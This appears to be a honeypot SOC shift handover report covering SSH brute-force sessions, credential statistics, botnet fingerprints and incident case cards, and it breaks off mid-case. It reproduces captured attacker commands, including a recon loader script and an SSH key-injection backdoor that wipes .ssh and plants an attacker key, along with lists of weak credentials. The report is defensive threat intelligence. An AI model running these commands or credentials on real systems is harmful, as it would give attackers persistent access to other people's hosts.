# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-20 |
| **Generated At** | 2026-08-20T20:34:17Z |
| **Shift Time** | 20:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **193** |
| Confirmed Threats | **161** |
| False Positives Filtered | **32** (16.6%) |
| Unique Attacker IPs | **79** |
| Countries of Origin | **30** |
| High Severity Cases | **108** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **85** |
| Malware Samples Analyzed | **3** HIGH · **21** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **131** |
| Unique Credential Pairs | **85** |
| Unique Usernames | **15** |
| Unique Passwords | **82** |
| Successful Auth Pairs | **118** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 44 |
| `admin` | 15 |
| `default` | 12 |
| `ubuntu` | 11 |
| `blank` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `default2017` | 6 |
| `default2006` | 6 |
| `user2018` | 6 |
| `nobody2022` | 5 |
| `support` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `default` | `default2017` | 6 |
| `default` | `default2006` | 6 |
| `user` | `user2018` | 6 |
| `nobody` | `nobody2022` | 5 |
| `support` | `support` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `debian` | `debian2010` | `197.251.193.6` | 2026-08-20T16:55:14 |
| `debian` | `debian2010` | `93.241.232.14` | 2026-08-20T16:55:27 |
| `root` | `1234567890` | `195.178.110.217` | 2026-08-20T16:56:35 |
| `ubuntu` | `Zz@123456` | `217.60.255.130` | 2026-08-20T16:56:39 |
| `root` | `123123` | `217.60.255.130` | 2026-08-20T16:57:34 |
| `root` | `123qwe` | `195.178.110.217` | 2026-08-20T16:58:18 |
| `root` | `123qwerty` | `195.178.110.217` | 2026-08-20T17:00:12 |
| `support` | `support` | `10.0.0.73` | 2026-08-20T17:01:27 |
| `admin` | `admin` | `106.15.236.209` | 2026-08-20T17:01:31 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-20T17:01:32 |
| `root` | `21` | `195.178.110.217` | 2026-08-20T17:01:59 |
| `default` | `default2017` | `177.135.206.10` | 2026-08-20T17:03:34 |
| `default` | `default2017` | `111.171.127.190` | 2026-08-20T17:03:44 |
| `root` | `321` | `195.178.110.217` | 2026-08-20T17:03:44 |
| `root` | `4321` | `195.178.110.217` | 2026-08-20T17:05:29 |
| `root` | `54321` | `195.178.110.217` | 2026-08-20T17:06:57 |
| `ubuntu` | `1.23456E+11` | `217.60.255.130` | 2026-08-20T17:07:09 |
| `blank` | `blank2022` | `122.170.98.139` | 2026-08-20T17:07:30 |
| `blank` | `blank2022` | `122.170.100.253` | 2026-08-20T17:07:42 |
| `blank` | `blank2022` | `112.31.93.229` | 2026-08-20T17:07:43 |
| `blank` | `blank2022` | `203.123.219.137` | 2026-08-20T17:07:53 |
| `root` | `123321` | `217.60.255.130` | 2026-08-20T17:08:02 |
| `root` | `654321` | `195.178.110.217` | 2026-08-20T17:08:36 |
| `root` | `P4ssw0rd` | `195.178.110.217` | 2026-08-20T17:10:12 |
| `blank` | `blank2017` | `10.0.0.73` | 2026-08-20T17:10:58 |
| `root` | `P4ssword` | `195.178.110.217` | 2026-08-20T17:11:49 |
| `blank` | `blank2017` | `178.178.194.192` | 2026-08-20T17:12:27 |
| `root` | `P@ssw0rd` | `195.178.110.217` | 2026-08-20T17:13:29 |
| `default` | `default2017` | `10.0.0.73` | 2026-08-20T17:14:56 |
| `root` | `Passw0rd` | `195.178.110.217` | 2026-08-20T17:15:07 |
| `root` | `p4ssword` | `195.178.110.217` | 2026-08-20T17:16:47 |
| `ubuntu` | `mypassword` | `217.60.255.130` | 2026-08-20T17:17:41 |
| `root` | `p@ssw0rd` | `195.178.110.217` | 2026-08-20T17:18:26 |
| `root` | `passw0rd` | `195.178.110.217` | 2026-08-20T17:20:03 |
| `root` | `password` | `195.178.110.217` | 2026-08-20T17:21:41 |
| `root` | `qwerty` | `195.178.110.217` | 2026-08-20T17:23:21 |
| `root` | `root1` | `195.178.110.217` | 2026-08-20T17:26:57 |
| `blank` | `blank2017` | `124.88.174.143` | 2026-08-20T17:28:25 |
| `ubuntu` | `1qaz2wsx3edc4rfv` | `217.60.255.130` | 2026-08-20T17:28:30 |
| `blank` | `blank2017` | `170.247.3.15` | 2026-08-20T17:28:34 |
| `root` | `root12` | `195.178.110.217` | 2026-08-20T17:28:50 |
| `root` | `123465` | `217.60.255.130` | 2026-08-20T17:29:10 |
| `root` | `root123` | `195.178.110.217` | 2026-08-20T17:30:28 |
| `default` | `default2017` | `195.158.26.59` | 2026-08-20T17:31:58 |
| `root` | `root1234` | `195.178.110.217` | 2026-08-20T17:32:02 |
| `default` | `default2017` | `220.178.39.106` | 2026-08-20T17:32:07 |
| `root` | `root12345` | `195.178.110.217` | 2026-08-20T17:33:37 |
| `root` | `root123456` | `195.178.110.217` | 2026-08-20T17:35:13 |
| `root` | `root1234567` | `195.178.110.217` | 2026-08-20T17:36:52 |
| `root` | `root123456789` | `195.178.110.217` | 2026-08-20T17:38:38 |
| `ubuntu` | `Qwerty12345` | `217.60.255.130` | 2026-08-20T17:39:25 |
| `root` | `142536` | `217.60.255.130` | 2026-08-20T17:40:00 |
| `root` | `root1234567890` | `195.178.110.217` | 2026-08-20T17:40:30 |
| `guest` | `guest2015` | `34.41.211.48` | 2026-08-20T17:40:47 |
| `guest` | `guest2015` | `39.164.91.67` | 2026-08-20T17:40:56 |
| `guest` | `guest2015` | `1.212.225.99` | 2026-08-20T17:41:00 |
| `guest` | `guest2015` | `178.178.194.128` | 2026-08-20T17:41:10 |
| `support` | `support` | `176.53.159.196` | 2026-08-20T17:41:11 |
| `admin` | `admin` | `104.236.83.40` | 2026-08-20T17:41:56 |
| `admin` | `1` | `195.178.110.217` | 2026-08-20T17:42:26 |
| `admin` | `12` | `195.178.110.217` | 2026-08-20T17:44:16 |
| `nobody` | `nobody2022` | `10.0.0.73` | 2026-08-20T17:44:33 |
| `admin` | `123` | `195.178.110.217` | 2026-08-20T17:45:50 |
| `nobody` | `nobody2022` | `61.2.44.54` | 2026-08-20T17:46:14 |
| `nobody` | `nobody2022` | `138.118.213.68` | 2026-08-20T17:46:23 |
| `admin` | `1234` | `195.178.110.217` | 2026-08-20T17:47:21 |
| `blank` | `blank2010` | `10.0.0.73` | 2026-08-20T17:48:14 |
| `admin` | `12345` | `195.178.110.217` | 2026-08-20T17:48:48 |
| `ubuntu` | `Ab@123456` | `217.60.255.130` | 2026-08-20T17:50:14 |
| `admin` | `123456` | `195.178.110.217` | 2026-08-20T17:50:16 |
| `root` | `159263` | `217.60.255.130` | 2026-08-20T17:50:41 |
| `admin` | `1234567` | `195.178.110.217` | 2026-08-20T17:51:43 |
| `root` | `﻿------fuck------` | `42.202.32.73` | 2026-08-20T17:52:54 |
| `admin` | `12345678` | `195.178.110.217` | 2026-08-20T17:53:13 |
| `admin` | `123456789` | `195.178.110.217` | 2026-08-20T17:54:47 |
| `debian` | `debian2020` | `10.0.0.73` | 2026-08-20T17:55:46 |
| `admin` | `1234567890` | `195.178.110.217` | 2026-08-20T17:56:31 |
| `admin` | `123qwe` | `195.178.110.217` | 2026-08-20T17:58:19 |
| `ubuntu` | `1qaZ2wsX` | `217.60.255.130` | 2026-08-20T18:01:34 |
| `root` | `159753` | `217.60.255.130` | 2026-08-20T18:01:44 |
| `nobody` | `nobody2022` | `63.47.149.59` | 2026-08-20T18:01:49 |
| `nobody` | `nobody2022` | `107.135.117.245` | 2026-08-20T18:01:56 |
| `default` | `default2006` | `221.199.172.66` | 2026-08-20T18:10:20 |
| `default` | `default2006` | `222.139.245.137` | 2026-08-20T18:10:30 |
| `ubuntu` | `Admin123` | `217.60.255.130` | 2026-08-20T18:12:29 |
| `root` | `212121` | `217.60.255.130` | 2026-08-20T18:12:50 |
| `debian` | `debian2020` | `217.150.37.249` | 2026-08-20T18:14:00 |
| `debian` | `debian2020` | `14.153.226.83` | 2026-08-20T18:14:09 |
| `veera` | `veera` | `182.93.7.194` | 2026-08-20T18:16:49 |
| `345gs5662d34` | `345gs5662d34` | `182.93.7.194` | 2026-08-20T18:16:53 |
| `veera` | `3245gs5662d34` | `182.93.7.194` | 2026-08-20T18:16:54 |
| `user` | `user2018` | `10.0.0.73` | 2026-08-20T18:17:54 |
| `user` | `user2018` | `208.96.233.67` | 2026-08-20T18:19:13 |
| `user` | `user2018` | `182.75.197.174` | 2026-08-20T18:19:26 |
| `default` | `default2006` | `10.0.0.73` | 2026-08-20T18:21:42 |
| `ubuntu` | `1qazXSW@` | `217.60.255.130` | 2026-08-20T18:23:35 |
| `root` | `225588` | `217.60.255.130` | 2026-08-20T18:23:55 |
| `test` | `test2018` | `10.0.0.73` | 2026-08-20T18:28:58 |
| `ubuntu` | `Aa@12345678` | `217.60.255.130` | 2026-08-20T18:34:49 |
| `root` | `321321` | `217.60.255.130` | 2026-08-20T18:34:57 |
| `user` | `user2018` | `65.20.141.202` | 2026-08-20T18:35:06 |
| `user` | `user2018` | `182.60.128.241` | 2026-08-20T18:35:14 |
| `root` | `ubnt` | `213.34.241.34` | 2026-08-20T18:37:57 |
| `root` | `root01` | `213.34.241.34` | 2026-08-20T18:37:58 |
| `pi` | `raspberry` | `213.34.241.34` | 2026-08-20T18:37:58 |
| `admin` | `admin123` | `213.34.241.34` | 2026-08-20T18:37:59 |
| `default` | `default2006` | `196.190.180.18` | 2026-08-20T18:38:19 |
| `default` | `default2006` | `182.139.39.150` | 2026-08-20T18:38:29 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-20T18:39:39 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-20T18:39:39 |
| `ubuntu` | `test@1234` | `217.60.255.130` | 2026-08-20T18:45:47 |
| `root` | `321654` | `217.60.255.130` | 2026-08-20T18:46:03 |
| `test` | `test2018` | `114.30.223.119` | 2026-08-20T18:47:02 |
| `test` | `test2018` | `122.160.142.194` | 2026-08-20T18:47:12 |
| `unknown` | `unknown2023` | `10.0.0.73` | 2026-08-20T18:50:47 |
| `unknown` | `unknown2023` | `85.195.9.20` | 2026-08-20T18:52:23 |
| `unknown` | `unknown2023` | `190.12.109.162` | 2026-08-20T18:52:31 |
| `nobody` | `nobody2019` | `10.0.0.73` | 2026-08-20T18:54:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **193** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 45 |
| OpenSSH | 36 |
| libssh | 32 |
| Unknown | 2 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 38 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 36 | 36 |
| `419da4c91ddb...` | Modern SSH client | 22 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 38 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 36 | 36 | Mirai/variant |
| `419da4c91ddb...` | libssh | 22 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 3 | — |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 37 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.217`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `182.93.7.194`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **79** |
| Unique ASNs | **62** |
| High-Risk ASNs | **48** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 3 | HIGH |
| `AS209334` | Modat B.V. | 3 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS7018` | AT&T Enterprises, LLC | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS8193` | Uzbektelekom Joint Stock Company | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (104)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-96c3ade90832

| Field | Detail |
|---|---|
| **Source IP** | `197.251.193[.]6` |
| **First Seen** | 2026-08-20 16:55 |
| **Last Seen** | 2026-08-20 16:55 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:55:05` | `cowrie.session.connect` |
| `2026-08-20 16:55:08` | `cowrie.client.version` |
| `2026-08-20 16:55:08` | `cowrie.client.kex` |
| `2026-08-20 16:55:14` | `cowrie.login.success` |
| `2026-08-20 16:55:15` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.251.193[.]6` to AbuseIPDB if not already reported
- [ ] Block `197.251.193[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed03fe45c677

| Field | Detail |
|---|---|
| **Source IP** | `93.241.232[.]14` |
| **First Seen** | 2026-08-20 16:55 |
| **Last Seen** | 2026-08-20 16:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:55:25` | `cowrie.session.connect` |
| `2026-08-20 16:55:26` | `cowrie.client.version` |
| `2026-08-20 16:55:26` | `cowrie.client.kex` |
| `2026-08-20 16:55:27` | `cowrie.login.success` |
| `2026-08-20 16:55:28` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.241.232[.]14` to AbuseIPDB if not already reported
- [ ] Block `93.241.232[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9ec848ed541

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 16:56 |
| **Last Seen** | 2026-08-20 16:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:56:33` | `cowrie.session.connect` |
| `2026-08-20 16:56:33` | `cowrie.client.version` |
| `2026-08-20 16:56:33` | `cowrie.client.kex` |
| `2026-08-20 16:56:35` | `cowrie.login.success` |
| `2026-08-20 16:56:36` | `cowrie.session.params` |
| `2026-08-20 16:56:36` | `cowrie.command.input` |
| `2026-08-20 16:56:36` | `cowrie.command.input` |
| `2026-08-20 16:56:36` | `cowrie.command.input` |
| `2026-08-20 16:56:36` | `cowrie.command.input` |
| `2026-08-20 16:56:36` | `cowrie.command.input` |
| `2026-08-20 16:56:36` | `cowrie.command.success` |
| `2026-08-20 16:56:36` | `cowrie.command.input` |
| `2026-08-20 16:56:36` | `cowrie.command.input` |
| `2026-08-20 16:56:36` | `cowrie.command.input` |
| `2026-08-20 16:56:36` | `cowrie.command.input` |
| `2026-08-20 16:56:36` | `cowrie.log.closed` |
| `2026-08-20 16:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-516968936fca

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:56 |
| **Last Seen** | 2026-08-20 16:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:56:35` | `cowrie.session.connect` |
| `2026-08-20 16:56:35` | `cowrie.client.version` |
| `2026-08-20 16:56:36` | `cowrie.client.kex` |
| `2026-08-20 16:56:39` | `cowrie.login.success` |
| `2026-08-20 16:56:39` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:56:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 16:56:40` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fb1f9bbe813

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:57 |
| **Last Seen** | 2026-08-20 16:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:57:32` | `cowrie.session.connect` |
| `2026-08-20 16:57:32` | `cowrie.client.version` |
| `2026-08-20 16:57:32` | `cowrie.client.kex` |
| `2026-08-20 16:57:34` | `cowrie.login.success` |
| `2026-08-20 16:57:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3810a1e6d0aa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 16:58 |
| **Last Seen** | 2026-08-20 16:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:58:17` | `cowrie.session.connect` |
| `2026-08-20 16:58:17` | `cowrie.client.version` |
| `2026-08-20 16:58:17` | `cowrie.client.kex` |
| `2026-08-20 16:58:18` | `cowrie.login.success` |
| `2026-08-20 16:58:19` | `cowrie.session.params` |
| `2026-08-20 16:58:19` | `cowrie.command.input` |
| `2026-08-20 16:58:19` | `cowrie.command.input` |
| `2026-08-20 16:58:19` | `cowrie.command.input` |
| `2026-08-20 16:58:19` | `cowrie.command.input` |
| `2026-08-20 16:58:19` | `cowrie.command.input` |
| `2026-08-20 16:58:19` | `cowrie.command.success` |
| `2026-08-20 16:58:19` | `cowrie.command.input` |
| `2026-08-20 16:58:19` | `cowrie.command.input` |
| `2026-08-20 16:58:19` | `cowrie.command.input` |
| `2026-08-20 16:58:19` | `cowrie.command.input` |
| `2026-08-20 16:58:19` | `cowrie.log.closed` |
| `2026-08-20 16:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-400b85baf9ff

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:00 |
| **Last Seen** | 2026-08-20 17:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:00:11` | `cowrie.session.connect` |
| `2026-08-20 17:00:11` | `cowrie.client.version` |
| `2026-08-20 17:00:11` | `cowrie.client.kex` |
| `2026-08-20 17:00:12` | `cowrie.login.success` |
| `2026-08-20 17:00:14` | `cowrie.session.params` |
| `2026-08-20 17:00:14` | `cowrie.command.input` |
| `2026-08-20 17:00:14` | `cowrie.command.input` |
| `2026-08-20 17:00:14` | `cowrie.command.input` |
| `2026-08-20 17:00:14` | `cowrie.command.input` |
| `2026-08-20 17:00:14` | `cowrie.command.input` |
| `2026-08-20 17:00:14` | `cowrie.command.success` |
| `2026-08-20 17:00:14` | `cowrie.command.input` |
| `2026-08-20 17:00:14` | `cowrie.command.input` |
| `2026-08-20 17:00:14` | `cowrie.command.input` |
| `2026-08-20 17:00:14` | `cowrie.command.input` |
| `2026-08-20 17:00:14` | `cowrie.log.closed` |
| `2026-08-20 17:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fde953a9693

| Field | Detail |
|---|---|
| **Source IP** | `106.15.236[.]209` |
| **First Seen** | 2026-08-20 17:01 |
| **Last Seen** | 2026-08-20 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:01:30` | `cowrie.session.connect` |
| `2026-08-20 17:01:30` | `cowrie.client.version` |
| `2026-08-20 17:01:30` | `cowrie.client.kex` |
| `2026-08-20 17:01:31` | `cowrie.login.success` |
| `2026-08-20 17:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.15.236[.]209` to AbuseIPDB if not already reported
- [ ] Block `106.15.236[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f94814eda931

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-20 17:01 |
| **Last Seen** | 2026-08-20 17:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
